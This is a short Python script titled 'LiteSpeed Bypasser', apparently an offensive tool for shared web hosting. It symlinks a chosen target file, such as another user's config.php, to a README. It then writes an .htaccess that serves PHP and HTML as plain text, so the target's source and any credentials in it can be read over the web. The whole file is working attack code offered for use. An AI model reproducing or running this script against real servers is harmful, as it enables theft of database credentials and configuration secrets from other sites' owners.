#/
LiteSpeed Bypasser
#/

import os,sys

try:
	os.system("rm -rf turk")
	os.mkdir("turk")
	os.system("chmod +x turk")
	os.chdir("turk")
	with open("own.sh","w") as bypass:
		bypass.write("ln -s " + sys.argv[1] + " README")
	with open(".htaccess","w") as htaccess:
		htaccess.write("OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI\nOptions Indexes FollowSymLinks\nForceType text/plain\nAddType text/plain .php\nAddType text/plain .html\nAddType text/html .shtml\nAddType txt .php\nAddHandler server-parsed .php\nAddHandler txt .php\nAddHandler txt .html\nAddHandler txt .shtml\nOptions All\nReadMeName README")
	os.system("chmod +x own.sh")
	os.system("./own.sh")
	os.system("rm -rf own.sh")
	print("#/\n#* LiteSpeed Bypass\\n#* Twitter : M3T4LSEC\n#* Thx to all turkish\n#/\n\n[+] Bypassed Successfully!\n[!] Please check turk folder!")
except:
	print("Please enter your target file! Use : python litespeedown.py /home/user/public_html/config.php")
